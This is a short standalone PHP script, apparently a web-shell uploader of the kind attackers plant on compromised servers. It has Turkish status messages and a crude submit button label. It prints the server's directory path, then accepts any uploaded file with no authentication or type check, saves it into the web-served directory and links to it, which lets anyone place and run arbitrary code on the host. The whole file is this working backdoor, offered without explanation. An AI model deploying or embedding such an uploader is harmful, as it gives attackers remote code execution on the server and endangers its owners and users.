<?php
echo "<b>Path:</b> " . __DIR__ . "<br>";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    foreach ($_FILES as $file) {
        $target = basename($file['name']);
        if (@move_uploaded_file($file['tmp_name'], $target)) {
            echo "✅ <b>$target</b> indi! <a href='$target'>Tıkla</a>";
        } else {
            echo "❌ Yazamadık!";
        }
    }
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="f"> <input type="submit" value="Fck!">
</form>
